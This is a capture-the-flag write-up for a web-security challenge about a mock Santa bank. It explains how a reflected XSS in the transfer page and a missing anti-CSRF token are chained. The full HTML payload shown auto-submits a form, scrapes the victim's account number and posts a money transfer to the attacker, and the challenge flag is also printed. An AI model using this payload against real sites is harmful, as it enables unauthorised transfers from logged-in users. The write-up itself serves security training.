# [HV22.14] Santa's Bank

<table>
  <tr>
    <th>Categories</th>
    <td>Web Security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

## Description
Santa has lost faith and trust in humanity and decided to take matters in his own hands: He opens a new bank.

He announced the release with the following message:

For Christmas, our bank has a generous offer: save 100 € in your savings account and get a promo code!

Due to mistrust, he didn't connect his bank and its employees to the internet.

Can you hack bank?

## Solution
From the challenge description and the web app, I concluded the following:
- Find a different account with a balance of >100$.
- Transfer 100$ to our account from that other account.

The support page looks suspicious. We can paste a URL that then gets opened by a support agent? Awesome!

![Support page](./dec14-support.png)

To validate the assumption, I connected via VPN and started a `nc -l 1234` on my machine.

The URL dropped on the support page was something like `http://<my-ip-address>:1234`.

And indeed, there was a http request shortly after I "opened my support ticket".

Cool - but how do I get the support elf to transfer money to me? An Cross-Site Scripting (XSS) vulnerability would be handy for this... The Cross-Site Request Forgery (CSRF) vulnerability was already given (since there was no anti-CSRF token present).

Searching through the webapp, I discovered an XSS vulnerability on the transfer page where the destination account was reflected if it was invalid.

With this, I was able to create the following payload returned from my "server" run via netcat (`nc -l 1234`), abusing the CSRF and XSS vulnerabilities in the web application:
1. As soon as the document was loaded, a POST request was sent to the `/transfer` endpoint including an invalid destination account.
2. The invalid destination account exploited the XSS vulnerability and executed a script with the following steps in the context of the support elf.
3. Extract the support elf's account number from the main page.
4. Create a transfer request by setting up a form data structure including my account as a target account.
5. POST request to the `/transfer` endpoint to trigger the transfer of 100$.

Here's the full payload:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 994
Server: ludus

<html>
<body onload='document.CSRF.submit()'>
<form action='https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/transfer' method='POST' name='CSRF'>
    <input type='hidden' name='from' value='DC57C6B34ACC1AF505CB'>
    <input type='hidden' name='to' value='asdASDF<script>
        (async() =>{
            let text  = await fetch("https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/").then((r) => r.text());
            let regex = /([0-9A-F]{20})/;
            let srcAccount = regex.exec(text)[0];
            let formData = new FormData();
            formData.append("from", srcAccount);
            formData.append("to", "DC57C6B34ACC1AF505CB");
            formData.append("amount", "100");
            await fetch("https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/transfer", {"method": "POST", "body": formData, "credentials": "include"});
        })();
        </script>'>
    <input type='hidden' name='amount' value='100'>
</form>
</body>
</html>
```

And we got that promotion code!

![Promotion code](./dec14-promotion.png)

## Links
- https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md#how-to-test

## Flag
```
HV22{XSS_XSRF_TOO_MANYS_XS}
```
